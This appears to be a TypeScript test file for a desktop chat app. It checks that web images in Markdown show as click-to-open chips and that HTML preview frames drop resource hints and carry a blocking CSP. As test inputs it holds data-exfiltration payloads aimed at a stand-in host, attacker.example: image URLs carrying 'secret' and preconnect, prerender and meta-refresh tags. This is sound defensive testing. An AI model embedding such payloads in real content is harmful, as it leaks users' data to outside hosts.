/**
 * IMG1 (0.1.64): an image from the web never loads by itself.
 * A: a Markdown image whose URL is not data:image/ shows as a chip; a web one opens in the browser on
 *    click (the native gate links use). Checked through every user of Markdown: chat replies, the
 *    reader and release notes.
 * C: every srcDoc frame drops <link> and <meta http-equiv> (a CSP can't stop preconnect or prerender)
 *    and starts with a CSP that blocks subresource loads.
 */
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

vi.mock("react-i18next", () => ({
  useTranslation: () => ({ t: (k: string, o?: Record<string, unknown>) => (o ? `${k}:${JSON.stringify(o)}` : k),
    i18n: { resolvedLanguage: "en", language: "en" } }),
}));
const { files, request } = vi.hoisted(() => ({
  files: { list: vi.fn(), read: vi.fn(), stat: vi.fn(), table: vi.fn(), html: vi.fn(), pdfPage: vi.fn(), open: vi.fn(),
    reveal: vi.fn(), home: vi.fn(), conversationFiles: vi.fn() },
  request: vi.fn(),
}));
vi.mock("../api/files", () => ({ filesApi: files }));
vi.mock("../api/client", async (orig) => ({ ...(await orig<object>()), request }));

import Markdown from "../components/Markdown";
import MessageBody, { HtmlDocCard } from "../components/MessageBody";
import Reader from "../components/workbench/Reader";
import AboutSection from "../components/settings/AboutSection";
import { FRAME_CSP, withFrameCsp } from "../lib/frameCsp";

type ShellWindow = Window & { __TAURI_INTERNALS__?: { invoke: ReturnType<typeof vi.fn> } };
const win = window as ShellWindow;
afterEach(() => { cleanup(); delete win.__TAURI_INTERNALS__; vi.clearAllMocks(); });

const PNG = "data:image/png;base64,iVBORw0KGgo=";
const WEB = [
  ["https", "https://h.example/p?d=1", "h.example"],
  ["http", "http://h.example/p?d=1", "h.example"],
  ["protocol-relative", "//h.example/p?d=1", "h.example"],
  ["upper-case scheme", "HTTPS://h.example/p", "h.example"],
] as const;
const NOT_WEB = [
  ["relative", "./diagram.png"],
  ["root-relative", "/api/files/x.png"],
  ["a scheme react-markdown drops", "javascript:alert(1)"],
  ["file:", "file:///etc/hosts"],
  ["blob: (no Markdown source can carry a live one)", "blob:http://127.0.0.1:8765/0b6f2c1e"],
  ["data: inside a web URL", "https://attacker.example/p?u=data:image/png;base64,AA"],
  ["blob: inside a web URL", "https://attacker.example/p?u=blob:x"],
] as const;

/** No <img> at all, and one chip, inside `root`. */
function expectChipNoImage(root: ParentNode = document) {
  expect(root.querySelector("img")).toBeNull();
  expect(root.querySelectorAll("[data-testid=md-image-chip]")).toHaveLength(1);
}

describe("A: Markdown images", () => {
  it.each(WEB)("a %s image renders no <img> and a chip naming the host", (_, url, host) => {
    render(<Markdown>{`See ![chart](${url}) here`}</Markdown>);
    expectChipNoImage();
    const chip = screen.getByTestId("md-image-chip");
    expect(chip).toHaveTextContent("chart");
    expect(chip).toHaveTextContent(`workbench.imageFrom:{"host":"${host}"}`);
    expect(chip.tagName).toBe("BUTTON");
    expect(chip.getAttribute("title")).toBe(url);
    expect(chip.closest("a")).toBeNull();
  });

  it.each(NOT_WEB)("a %s image renders no <img>", (_, url) => {
    render(<Markdown>{`![local](${url})`}</Markdown>);
    expectChipNoImage();
    const web = url.startsWith("https:");
    expect(screen.getByTestId("md-image-chip").tagName).toBe(web ? "BUTTON" : "SPAN");
    if (!web) expect(screen.getByTestId("md-image-chip")).toHaveTextContent("workbench.imageNotShown");
  });

  it("a reference-style web image is a chip too", () => {
    render(<Markdown>{"![ref][r]\n\n[r]: https://h.example/r.png"}</Markdown>);
    expectChipNoImage();
  });

  it("a data:image/ image still renders inline", () => {
    render(<Markdown>{`![inline](${PNG})`}</Markdown>);
    expect(document.querySelector("img")?.getAttribute("src")).toBe(PNG);
    expect(screen.queryByTestId("md-image-chip")).toBeNull();
  });

  it.each([["data:", "data:text/html;base64,PGI+eDwvYj4="], ["data:image/", PNG], ["blob:", "blob:http://127.0.0.1:8765/0b6f2c1e"]])(
    "a %s link keeps react-markdown's default: no href", (_, url) => {
      render(<Markdown>{`[x](${url})`}</Markdown>);
      expect(screen.getByText("x").closest("a")?.getAttribute("href")).toBe("");
    });

  it("a data: URL that isn't an image is not loaded", () => {
    render(<Markdown>{"![x](data:text/html;base64,PGI+eDwvYj4=)"}</Markdown>);
    expectChipNoImage();
  });

  it("clicking a web chip opens the URL through the native gate", () => {
    const invoke = vi.fn(async () => undefined);
    win.__TAURI_INTERNALS__ = { invoke };
    render(<Markdown>{"![chart](https://h.example/p?d=1)"}</Markdown>);
    fireEvent.click(screen.getByTestId("md-image-chip"));
    expect(invoke).toHaveBeenCalledExactlyOnceWith("open_external", { url: "https://h.example/p?d=1" });
  });

  it("a chip inside a link opens only the image, once", () => {
    const invoke = vi.fn(async () => undefined);
    win.__TAURI_INTERNALS__ = { invoke };
    render(<Markdown>{"[![logo](https://a.example/logo.png)](https://attacker.example/?d=secret)"}</Markdown>);
    fireEvent.click(screen.getByTestId("md-image-chip"));
    expect(invoke).toHaveBeenCalledExactlyOnceWith("open_external", { url: "https://a.example/logo.png" });
  });

  it("a chip inside a link doesn't follow the link in a plain browser either", () => {
    const open = vi.spyOn(window, "open").mockReturnValue(null);
    render(<Markdown>{"[![logo](https://a.example/logo.png)](https://attacker.example/?d=secret)"}</Markdown>);
    const click = new MouseEvent("click", { bubbles: true, cancelable: true });
    screen.getByTestId("md-image-chip").dispatchEvent(click);
    expect(click.defaultPrevented).toBe(true);
    expect(open).toHaveBeenCalledExactlyOnceWith("https://a.example/logo.png", "_blank", "noopener,noreferrer");
    open.mockRestore();
  });

  it("a refused chip says so", async () => {
    win.__TAURI_INTERNALS__ = { invoke: vi.fn(async () => { throw new Error("refused"); }) };
    render(<Markdown>{"![x](//h.example/p)"}</Markdown>);
    fireEvent.click(screen.getByTestId("md-image-chip"));
    expect(await screen.findByRole("alert")).toHaveTextContent("externalLink.failed");
  });

  it("links are untouched", () => {
    render(<Markdown>{"[docs](https://h.example/docs)"}</Markdown>);
    expect(screen.getByRole("link").getAttribute("href")).toBe("https://h.example/docs");
    expect(screen.queryByTestId("md-image-chip")).toBeNull();
  });
});

describe("A: every user of Markdown", () => {
  it("a chat reply", () => {
    render(<MessageBody text={"Here: ![x](https://h.example/p?d=secret) and ![y](" + PNG + ")"} />);
    expect(document.querySelectorAll("img")).toHaveLength(1);
    expect(document.querySelector("img")?.getAttribute("src")).toBe(PNG);
    expect(screen.getAllByTestId("md-image-chip")).toHaveLength(1);
  });

  it("the reader, for a Markdown file", async () => {
    render(<Reader source={{ kind: "text", name: "AGENTS.md", text: "# Rules\n\n![x](https://h.example/p?d=1)" }} onBack={() => {}} />);
    const body = await screen.findByTestId("reader-markdown");
    expectChipNoImage(body);
  });

  it("release notes in About", async () => {
    request.mockResolvedValue({ version: "0.1.64", releases: [{ version: "0.1.64", notes: "New ![x](https://h.example/p.png)" }] });
    render(<AboutSection />);
    await waitFor(() => expect(screen.getByTestId("md-image-chip")).toBeInTheDocument());
    expectChipNoImage(screen.getByTestId("settings-whats-new"));
  });
});

/** Hints a CSP can't stop: preconnect/dns-prefetch leak the host, prerender sends a GET (Chrome). */
const HINTS = `<link rel="preconnect" href="https://d1.attacker.example"><link rel="dns-prefetch" href="//d2.attacker.example">`
  + `<LINK REL="prerender" HREF="https://attacker.example/?d=secret"><link rel=stylesheet href="https://attacker.example/s.css">`
  + `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=r">`
  + `<meta http-equiv="Content-Security-Policy" content="img-src *">`;

/** The CSP meta comes first (a srcdoc document is never in quirks mode), and it is the only
 *  <meta http-equiv>; no <link> is left anywhere. */
function expectCspFirst(srcdoc: string | null) {
  expect(srcdoc?.startsWith(FRAME_CSP)).toBe(true);
  const doc = new DOMParser().parseFromString(srcdoc!, "text/html");
  expect(doc.querySelectorAll("link")).toHaveLength(0);
  expect([...doc.querySelectorAll("meta[http-equiv]")].map((m) => m.outerHTML)).toEqual([FRAME_CSP]);
}

describe("C: frames drop resource hints and block subresource loads", () => {
  it("the policy is the card's", () => {
    expect(FRAME_CSP).toBe(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">`);
  });

  it("withFrameCsp puts the meta first and keeps the document", () => {
    const out = withFrameCsp(`<!doctype html><html><head><meta charset="utf-8"><title>T</title><style>p{color:red}</style></head><body><p class="k">x</p></body></html>`);
    expectCspFirst(out);
    const doc = new DOMParser().parseFromString(out, "text/html");
    expect(doc.title).toBe("T");
    expect(doc.querySelector("meta[charset]")).not.toBeNull();
    expect(doc.querySelector("style")?.textContent).toBe("p{color:red}");
    expect(doc.querySelector("p.k")?.textContent).toBe("x");
  });

  it.each([
    ["in the head", `<html><head>${HINTS}</head><body><p>x</p></body></html>`],
    ["in the body", `<p>x</p>${HINTS}`],
    ["inside noscript (parsed as markup when scripts are off, as in the frame)", `<noscript>${HINTS}</noscript><p>x</p>`],
    ["inside svg", `<svg><link href="https://attacker.example/s"/></svg><p>x</p>${HINTS}`],
  ])("withFrameCsp drops every <link> and <meta http-equiv> %s", (_, html) => {
    const out = withFrameCsp(html);
    expectCspFirst(out);
    expect(out).not.toContain("attacker.example");
    expect(new DOMParser().parseFromString(out, "text/html").querySelector("p")?.textContent).toBe("x");
  });

  it("if anything unsafe were left after stripping, the frame shows nothing", () => {
    const remove = vi.spyOn(Element.prototype, "remove").mockImplementation(() => {});
    try {
      expect(withFrameCsp(`<p>x</p>${HINTS} unique-1`)).toBe(FRAME_CSP);
    } finally { remove.mockRestore(); }
  });

  it.each([["META", "a second meta http-equiv"], ["LINK", "a link"]])("if only %s survived stripping (%s), the frame shows nothing", (tag) => {
    const real = Element.prototype.remove;
    const remove = vi.spyOn(Element.prototype, "remove").mockImplementation(function (this: Element) {
      if (this.tagName !== tag) real.call(this);
    });
    try {
      expect(withFrameCsp(`<p>x</p>${HINTS} unique-${tag}`)).toBe(FRAME_CSP);
    } finally { remove.mockRestore(); }
  });

  it("the check parses exactly what the frame gets, in standards mode", () => {
    const parse = vi.spyOn(DOMParser.prototype, "parseFromString");
    try {
      const out = withFrameCsp(`<p>x</p>${HINTS} unique-2`);
      const last = parse.mock.calls.at(-1)?.[0];
      expect(last).toBe(`<!doctype html>${out}`);
      expect(parse.mock.results.at(-1)?.value.compatMode).toBe("CSS1Compat");
      expect(parse.mock.calls.every(([text]) => String(text).startsWith("<!doctype html>"))).toBe(true);
    } finally { parse.mockRestore(); }
  });

  it("a second frame with the same HTML isn't parsed again", () => {
    const html = `<p>x</p>${HINTS} unique-3`;
    const first = withFrameCsp(html);
    const parse = vi.spyOn(DOMParser.prototype, "parseFromString");
    try {
      expect(withFrameCsp(html)).toBe(first);
      expect(parse).not.toHaveBeenCalled();
    } finally { parse.mockRestore(); }
  });

  it("the reader's HTML frame", async () => {
    render(<Reader source={{ kind: "text", name: "page.html", text: `<!doctype html>${HINTS}<img src="https://h.example/p">` }} onBack={() => {}} />);
    expectCspFirst((await screen.findByTestId("reader-html")).getAttribute("srcdoc"));
  });

  it("the reader's Word frame", async () => {
    files.html.mockResolvedValue({ html: `<html><head>${HINTS}</head><body><img src="https://h.example/p"></body></html>` });
    render(<Reader source={{ kind: "path", path: "/tmp/letter.docx" }} onBack={() => {}} />);
    expectCspFirst((await screen.findByTestId("reader-doc")).getAttribute("srcdoc"));
  });

  it("a reply's HTML document preview", () => {
    render(<HtmlDocCard html={`<!DOCTYPE html><html><head>${HINTS}</head><body><img src="https://h.example/p"></body></html>`} />);
    fireEvent.click(screen.getByTitle("msg.preview"));
    const frame = screen.getByTitle("msg.html_preview");
    expectCspFirst(frame.getAttribute("srcdoc"));
    expect(frame.getAttribute("sandbox")).toBe("");
  });

  it("every srcDoc in the web app goes through withFrameCsp", () => {
    const sources = import.meta.glob(["../**/*.tsx", "!../**/*.test.tsx", "!../__tests__/**"], { query: "?raw", import: "default", eager: true }) as Record<string, string>;
    const uses = Object.entries(sources).flatMap(([file, text]) =>
      [...text.matchAll(/srcDoc=\{([^}]*)\}/g)].map((m) => [file, m[1].trim()]));
    expect(uses.length).toBeGreaterThanOrEqual(3);
    expect(uses.filter(([, expr]) => !expr.startsWith("withFrameCsp("))).toEqual([]);
  });
});
